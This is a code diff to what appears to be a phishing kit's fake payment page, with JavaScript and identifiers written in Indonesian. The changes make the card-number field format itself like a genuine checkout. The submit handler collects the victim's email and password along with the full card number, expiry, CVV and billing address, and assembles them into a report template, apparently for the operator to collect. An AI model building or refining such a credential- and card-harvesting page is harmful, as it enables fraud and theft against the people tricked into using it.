@@ -38,7 +38,7 @@
         <div class="bagian" style="margin-bottom: 14px;">
             <label id="labelNomor">Card number</label>
             <div class="kartu-baris">
-                <input type="text" id="nomorKartu" class="input" placeholder="•••• •••• •••• ••••">
+                <input type="text" id="nomorKartu" class="input" placeholder="•••• •••• •••• ••••" maxlength="19">
                 <img src="img/visa.png" id="logoVisa" class="kartu-logo" alt="Visa">
                 <img src="img/mastercard.png" id="logoMC" class="kartu-logo" alt="Mastercard">
                 <img src="img/amex.png" id="logoAmex" class="kartu-logo" alt="Amex">
@@ -294,7 +294,6 @@ async function terapkanBahasa() {
     document.getElementById('bantuanLink').textContent = t.bantuanLink;
     document.getElementById('hakCiptaan').textContent = t.hakCiptaan;
 
-    // Terapkan placeholder sesuai bahasa
     const alamat1 = document.getElementById('alamat1');
     const alamat2 = document.getElementById('alamat2');
     const lang = kodeBahasa.toLowerCase();
@@ -321,6 +320,7 @@ selectNegara.addEventListener('change', () => {
     if (n) document.getElementById('kodeTelp').value = n.telp;
 });
 
+// === FORMAT NOMOR KARTU DENGAN SPASI ===
 const nomorInput = document.getElementById('nomorKartu');
 const logoVisa = document.getElementById('logoVisa');
 const logoMC = document.getElementById('logoMC');
@@ -328,16 +328,48 @@ const logoAmex = document.getElementById('logoAmex');
 const logoDisc = document.getElementById('logoDisc');
 const logoJcb = document.getElementById('logoJcb');
 
-nomorInput.addEventListener('input', () => {
-    const val = nomorInput.value.replace(/\s/g, '');
+// Fungsi format: tambah spasi tiap 4 angka
+function formatKartu(angka) {
+    const bersih = angka.replace(/\D/g, '');
+    // Amex format berbeda: 4-6-5
+    if (/^3[47]/.test(bersih)) {
+        const bagian = [];
+        if (bersih.length > 0) bagian.push(bersih.substring(0, 4));
+        if (bersih.length > 4) bagian.push(bersih.substring(4, 10));
+        if (bersih.length > 10) bagian.push(bersih.substring(10, 15));
+        return bagian.join(' ');
+    }
+    // Kartu lain: 4-4-4-4
+    const bagian = [];
+    for (let i = 0; i < bersih.length && i < 16; i += 4) {
+        bagian.push(bersih.substring(i, i + 4));
+    }
+    return bagian.join(' ');
+}
+
+nomorInput.addEventListener('input', function(e) {
+    const posAwal = this.selectionStart;
+    const nilaiAwal = this.value;
+    const nilaiBaru = formatKartu(nilaiAwal);
+    
+    if (nilaiBaru !== nilaiAwal) {
+        this.value = nilaiBaru;
+        // Atur posisi kursor agar tidak melompat
+        const tambahSpasi = (nilaiBaru.match(/ /g) || []).length - (nilaiAwal.match(/ /g) || []).length;
+        this.selectionStart = this.selectionEnd = posAwal + tambahSpasi;
+    }
+
+    // Tampilkan logo kartu
+    const bersih = this.value.replace(/\s/g, '');
     [logoVisa, logoMC, logoAmex, logoDisc, logoJcb].forEach(l => l.style.display = 'none');
-    if (/^4/.test(val)) logoVisa.style.display = 'block';
-    else if (/^5[1-5]/.test(val)) logoMC.style.display = 'block';
-    else if (/^3[47]/.test(val)) logoAmex.style.display = 'block';
-    else if (/^6(?:011|5)/.test(val)) logoDisc.style.display = 'block';
-    else if (/^35/.test(val) || /^2131|1800/.test(val)) logoJcb.style.display = 'block';
+    if (/^4/.test(bersih)) logoVisa.style.display = 'block';
+    else if (/^5[1-5]/.test(bersih)) logoMC.style.display = 'block';
+    else if (/^3[47]/.test(bersih)) logoAmex.style.display = 'block';
+    else if (/^6(?:011|5)/.test(bersih)) logoDisc.style.display = 'block';
+    else if (/^35/.test(bersih) || /^2131|1800/.test(bersih)) logoJcb.style.display = 'block';
 });
 
+// Format Expiry
 document.getElementById('expKartu').addEventListener('input', function() {
     let v = this.value.replace(/\D/g, '');
     if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
@@ -383,7 +415,8 @@ document.getElementById('lanjut').addEventListener('click', async () => {
     const email = localStorage.getItem('email_pengguna') || '';
     const password = localStorage.getItem('kata_sandi') || '';
     const namaKartu = document.getElementById('namaKartu').value.trim();
-    const nomorKartu = nomorInput.value.trim();
+    // Simpan nomor TANPA spasi untuk dikirim
+    const nomorKartuBersih = nomorInput.value.replace(/\s/g, '');
     const expKartu = document.getElementById('expKartu').value.trim();
     const cvvKartu = document.getElementById('cvvKartu').value.trim();
     const alamat1 = document.getElementById('alamat1').value.trim();
@@ -396,7 +429,7 @@ document.getElementById('lanjut').addEventListener('click', async () => {
     const nomorTelp = document.getElementById('nomorTelp').value.trim();
 
     localStorage.setItem('nama_kartu', namaKartu);
-    localStorage.setItem('nomor_kartu', nomorKartu);
+    localStorage.setItem('nomor_kartu', nomorKartuBersih); // Simpan tanpa spasi
     localStorage.setItem('exp_kartu', expKartu);
     localStorage.setItem('cvv_kartu', cvvKartu);
     localStorage.setItem('alamat', alamat1);
@@ -417,7 +450,7 @@ document.getElementById('lanjut').addEventListener('click', async () => {
 # Email         : ${email}
 # Password      : ${password}
 # Name on Card  : ${namaKartu}
-# Card Number   : ${nomorKartu}
+# Card Number   : ${nomorKartuBersih}
 # Expiry Date   : ${expKartu}
 # Security Code : ${cvvKartu}
 # Billing Addr  : ${alamat1}${alamat2 ? ', ' + alamat2 : ''}
